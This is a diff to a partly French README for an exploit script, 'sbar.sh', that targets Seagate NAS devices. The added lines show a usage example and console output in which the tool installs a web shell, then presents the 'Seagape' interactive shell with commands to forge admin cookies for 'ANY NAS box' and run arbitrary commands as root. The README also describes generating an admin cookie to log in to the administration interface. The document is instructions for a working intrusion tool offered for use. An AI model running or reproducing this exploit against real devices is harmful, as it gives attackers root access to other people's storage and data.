@@ -16,7 +16,31 @@
 
 # UTILISATION:
  - sbar.sh IP PORT
- - sbar.sh 123.45.67.89 [7009]
+ - Exemple:
+ - sbar.sh 127.45.63.89 [7009]
+
+
+Establishing session with 127.45.63.89 ...
+Configuring administrative access ...
+Installing web shell (takes a while) ...
+Extracting id and hostname ...
+
+Seagape v1.0 -- Interactive Seagate NAS Webshell
+  - OJ Reeves (@TheColonial) - https://beyondbinary.io/
+  - https://beyondbinary.io/bbsec/001
+
+version           - Print the current firmware version to screen.
+dumpcookie        - Print the current cookie to screen.
+admincookie <ua>  - Create an admin login cookie (ua == user agent string).
+                    Add to your browser and access ANY NAS box as admin.
+help              - Show this help.
+exit / quit       - Run for the hills.
+<anything else>   - Execute the command on the server.
+
+Seagape (root@WKNAS)>
+
+
+
 
 # EXPLOITATION:
  - Generation/creation de cookie admin et authentificagtion à l'interface d'administration en tant qu'administrateur.
